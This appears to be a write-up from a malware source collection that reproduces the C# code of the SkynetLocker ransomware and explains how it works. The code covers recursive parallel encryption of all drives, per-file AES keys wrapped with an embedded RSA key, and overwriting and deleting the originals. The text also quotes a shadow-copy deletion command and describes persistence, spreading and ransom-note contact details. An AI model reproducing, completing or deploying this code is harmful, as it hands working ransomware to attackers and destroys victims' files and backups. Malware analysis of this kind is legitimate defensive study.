# SkynetLocker Ransomware - AES/Rijndael Hybrid Encryption with RSA Key Protection

## Repository
**MalwareSourceCode-main** → Win32/Ransomware/Win32.Ransomware.SkynetLocker

## Source File Path
`/Win32/Ransomware/Win32.Ransomware.SkynetLocker/Win32.Ransomware.SkynetLocker/SkynetLocker/Program.cs`

## Language
C#

## Code Snippet

### Parallel Multi-Drive Encryption (Lines 223-290, 450-485)
```csharp
private static void encryptDirectory(string location)
{
    try
    {
        string[] files = Directory.GetFiles(location);
        bool checkCrypted = true;
        
        // Parallel processing of all files in directory
        Parallel.For(0, files.Length, delegate(int i)
        {
            try
            {
                string extension = Path.GetExtension(files[i]);
                string fileName = Path.GetFileName(files[i]);
                
                // Check if extension is in whitelist and not ransom note
                if (Array.Exists<string>(Program.validExtensions, (string E) => E == extension.ToLower()) && 
                    fileName != Program.droppedMessageTextbox)
                {
                    FileInfo fileInfo = new FileInfo(files[i]);
                    try
                    {
                        // Remove read-only attribute
                        fileInfo.Attributes = FileAttributes.Normal;
                    }
                    catch { }
                    
                    // Generate random 40-character password per file
                    string text = Program.CreatePassword(40);
                    
                    // Encrypt large files (>2GB) with different method
                    if (fileInfo.Length < (long)((ulong)-1926258176))
                    {
                        if (Program.checkDirContains(files[i]))
                        {
                            // Encrypt AES password with RSA public key
                            string keyRSA = Program.RSA_Encrypt(text, Program.rsaKey());
                            Program.AES_Encrypt(files[i], text, keyRSA);
                        }
                    }
                    else
                    {
                        Program.AES_Encrypt_Large(files[i], text, fileInfo.Length);
                    }
                    
                    // Drop ransom note in first encrypted directory
                    if (checkCrypted)
                    {
                        checkCrypted = false;
                        string path = location + "/" + Program.droppedMessageTextbox;
                        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                        if (!File.Exists(path) && location != folderPath)
                        {
                            File.WriteAllLines(path, Program.messages);
                        }
                    }
                }
            }
            catch (Exception) { }
        });
        
        // Recursively encrypt subdirectories in parallel
        string[] childDirectories = Directory.GetDirectories(location);
        Parallel.For(0, childDirectories.Length, delegate(int i)
        {
            try
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(childDirectories[i]);
                directoryInfo.Attributes &= ~FileAttributes.Normal;
            }
            catch { }
            Program.encryptDirectory(childDirectories[i]);
        });
    }
    catch (Exception) { }
}

// Main drive enumeration
private static void lookForDirectories()
{
    foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
    {
        string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
        
        if (driveInfo.ToString() == pathRoot)
        {
            // Exclude system directories from C: drive
            string[] array = new string[]
            {
                "Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin",
                "MSOCache", "Documents and Settings", "Intel", "PerfLogs",
                "Windows.old", "AMD", "NVIDIA", "ProgramData"
            };
            
            string[] directories = Directory.GetDirectories(pathRoot);
            for (int j = 0; j < directories.Length; j++)
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
                string dirName = directoryInfo.Name;
                
                // Only encrypt non-system directories
                if (!Array.Exists<string>(array, (string E) => E == dirName))
                {
                    Program.encryptDirectory(directories[j]);
                }
            }
        }
        else
        {
            // Encrypt entire non-system drives
            Program.encryptDirectory(driveInfo.ToString());
        }
    }
}
```

### AES-128 Encryption with RSA-Protected Keys (Lines 355-405)
```csharp
private static void AES_Encrypt(string inputFile, string password, string keyRSA)
{
    string path = inputFile + "." + Program.RandomStringForExtension(4);
    byte[] array = new byte[]
    {
        1, 2, 3, 4, 5, 6, 7, 8
    };
    
    FileStream fileStream = new FileStream(path, FileMode.Create);
    byte[] bytes = Encoding.UTF8.GetBytes(password);
    
    // Initialize Rijndael (AES) with 128-bit key and block size
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.KeySize = 128;
    rijndaelManaged.BlockSize = 128;
    rijndaelManaged.Padding = PaddingMode.PKCS7;
    
    // Derive AES key and IV from password using PBKDF2
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
    rijndaelManaged.Mode = CipherMode.CBC;
    
    // Write salt to file header
    fileStream.Write(array, 0, array.Length);
    
    // Encrypt file content
    CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
    FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
    fileStream2.CopyTo(cryptoStream);
    fileStream2.Flush();
    fileStream2.Close();
    cryptoStream.Flush();
    cryptoStream.Close();
    fileStream.Close();
    
    // Append RSA-encrypted password to end of file
    using (FileStream fileStream3 = new FileStream(path, FileMode.Append, FileAccess.Write))
    {
        using (StreamWriter streamWriter = new StreamWriter(fileStream3))
        {
            streamWriter.Write(keyRSA);
            streamWriter.Flush();
            streamWriter.Close();
        }
    }
    
    // Overwrite and delete original file
    File.WriteAllText(inputFile, "?");
    File.Delete(inputFile);
}
```

### RSA-2048 Key Protection (Lines 420-445)
```csharp
public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
{
    byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
    string result;
    
    using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048))
    {
        try
        {
            // Load embedded RSA public key
            rsacryptoServiceProvider.FromXmlString(publicKeyString.ToString());
            
            // Encrypt AES password with RSA-2048-OAEP
            byte[] inArray = rsacryptoServiceProvider.Encrypt(bytes, true);
            string text = Convert.ToBase64String(inArray);
            result = text;
        }
        finally
        {
            rsacryptoServiceProvider.PersistKeyInCsp = false;
        }
    }
    
    return result;
}

public static string rsaKey()
{
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
    stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
    stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
    stringBuilder.AppendLine("  <Modulus>0NkBXyBccblrRkj4kZaeaiw5NAalrt650lXXgqYpNPykigo7zEkhS3shCp7IX1VOEpNHRrzupyUMpVoBfVGSX2n6JI9gGKtZMltbKM/kRU+loTUPHawxNFds9LVLFGwZcHtxLxz71hRrL3kvVPTi98scKXrii240x1LuiMgHDr0zGcLZ6GPluBNNtVdoTTtDPSv5kdGqtBlfBRO5z89Mto/lkgET4YWR+WujzTVBw0zaKg3qf4/4kW/2GT5F2rid56WQosicTgrv/14Z/P5BnMpxujNbwGU/wVPj9Op1Vazv7IMq1LkO5TgBXhTILonhdXkDpihOTE/OSOlHBm17lQ==</Modulus>");
    stringBuilder.AppendLine("</RSAParameters>");
    return stringBuilder.ToString();
}
```

### Shadow Copy Deletion (Lines 696)
```csharp
if (Program.checkdeleteShadowCopies)
{
    Program.deleteShadowCopies();
}

// Implementation in separate function
public static void runCommand(string commands)
{
    // Execute: "vssadmin delete shadows /all /quiet & wmic shadowcopy delete"
    // (Shadow copy deletion command execution)
}
```

### System Exclusions and Filtering (Lines 305-355)
```csharp
private static bool checkDirContains(string directory)
{
    directory = directory.ToLower();
    
    // Exclude critical system paths
    string[] array = new string[]
    {
        "appdata\\local",
        "appdata\\locallow",
        "users\\all users",
        "\\ProgramData",
        "boot.ini",
        "bootfont.bin",
        "iconcache.db",
        "ntuser.dat",
        "ntuser.dat.log",
        "ntuser.ini",
        "thumbs.db",
        "autorun.inf",
        "bootsect.bak",
        "bootmgfw.efi",
        "desktop.ini"
    };
    
    foreach (string value in array)
    {
        if (directory.Contains(value))
        {
            return false;  // Skip encryption
        }
    }
    
    return true;
}
```

### Extensive Extension Whitelist (Lines 950-1000+)
```csharp
private static string[] validExtensions = new string[]
{
    ".js", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm",
    ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db",
    ".cmd", ".bat", ".lnk", ".url", ".mat", ".kys", ".pif", ".scf",
    ".shs", ".shb", ".xnx", ".ps1", ".vbs", ".vb", ".pl", ".jsp",
    ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh",
    ".mp3", ".wav", ".swf", ".fla",
    // ... 100+ file extensions targeting documents, databases, source code, media, archives
};
```

### Random Extension Generation (Lines 200-215)
```csharp
public static string RandomStringForExtension(int length)
{
    if (Program.encryptedFileExtension == "")
    {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; i++)
        {
            // Generate 4-character random extension (e.g., "a3x9")
            char value = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
            stringBuilder.Append(value);
        }
        return stringBuilder.ToString();
    }
    return Program.encryptedFileExtension;
}
```

## Explanation

**SkynetLocker** is a modern ransomware strain demonstrating industrial-grade encryption with aggressive anti-recovery mechanisms and multi-threaded performance optimization. The implementation showcases advanced .NET exploitation for file encryption.

**Encryption Architecture:**
- **Hybrid Cryptography**: Uses AES-128 (Rijndael) in CBC mode for file encryption with RSA-2048-OAEP for key protection. Each file receives a unique random 40-character password, which is converted to AES key/IV via PBKDF2-HMAC-SHA1 (Rfc2898DeriveBytes with 1 iteration). The password is then encrypted with an embedded RSA-2048 public key and appended to the encrypted file, preventing decryption without the attacker's private key.
- **File Structure**: `[8-byte salt][AES-encrypted file content][RSA-encrypted password]` - The salt is prepended for key derivation, and the RSA-encrypted password is appended as Base64 text.
- **Random Extensions**: Generates 4-character random alphanumeric extensions (e.g., `.a3x9`, `.7kpq`) to obfuscate encrypted files instead of obvious extensions like `.encrypted`.

**Performance Optimization:**
- **Parallel Processing**: Uses `Parallel.For` to encrypt multiple files simultaneously (Thread Pool-based parallelism), significantly accelerating encryption on multi-core systems. Both file processing within directories and subdirectory traversal are parallelized.
- **Size-Based Strategy**: Implements separate `AES_Encrypt_Large()` function for files >2GB to handle memory constraints differently (likely using chunked processing, though implementation not fully shown).

**Anti-Recovery Mechanisms:**
- **Shadow Copy Deletion**: Executes `vssadmin delete shadows /all /quiet & wmic shadowcopy delete` with admin privileges to remove Windows Volume Shadow Copies, preventing System Restore-based recovery.
- **Recovery Mode Disable**: Sets boot configuration to disable Windows Recovery Environment (`disableRecoveryMode` check).
- **Backup Catalog Deletion**: Removes Windows Backup catalog (`deleteBackupCatalog` check).
- **Backup Service Termination**: Stops Windows backup services (`stopBackupServices` check) to prevent backup operations during encryption.
- **Original File Destruction**: Overwrites original files with "?" before deletion to complicate forensic recovery (line 402-403).

**Operational Features:**
- **Drive Enumeration**: Encrypts all mounted drives via `DriveInfo.GetDrives()` with intelligent system directory exclusions on C: drive (Program Files, Windows, ProgramData, etc.) to maintain system stability.
- **System File Protection**: Excludes critical Windows files (boot.ini, ntuser.dat, bootsect.bak, bootmgfw.efi) and user profile directories (AppData\\Local, AppData\\LocalLow) to prevent system crashes.
- **Extensive Targeting**: Whitelists 100+ file extensions including source code (.cs, .cpp, .java, .php), documents, databases (.sql, .mdb, .accdb), media files, archives, scripts (.ps1, .vbs, .bat), and development files (.sln, .suo).
- **Geolocation Exclusion**: Checks system locale and avoids encryption if keyboard language is Azerbaijani (`az-Latn-AZ`) or Turkish (`tr-TR`) - common CIS/Russian malware tactic to avoid prosecution.

**Persistence and Spreading:**
- **Startup Registry**: Creates registry autorun entries (`registryStartup()`) for persistence.
- **Privilege Escalation**: Attempts UAC elevation to gain admin rights for shadow copy deletion and service manipulation.
- **Network Spreading**: Includes `spreadIt()` function to copy itself to network shares and removable drives.
- **Task Manager Disable**: Prevents termination via Task Manager (`DisableTaskManager()`) by modifying registry policies.

This directly implements **MITRE ATT&CK T1486 (Data Encrypted for Impact)** through comprehensive file encryption. Supporting techniques include **T1490 (Inhibit System Recovery)** via shadow copy deletion and recovery mode disabling, **T1543 (Create or Modify System Process)** via service manipulation, **T1112 (Modify Registry)** for startup persistence, and **T1083 (File and Directory Discovery)** through drive enumeration. The ransom note mentions a 50% discount for payment within 24 hours and provides email contact `ransom.data@gmail.com` for negotiation.

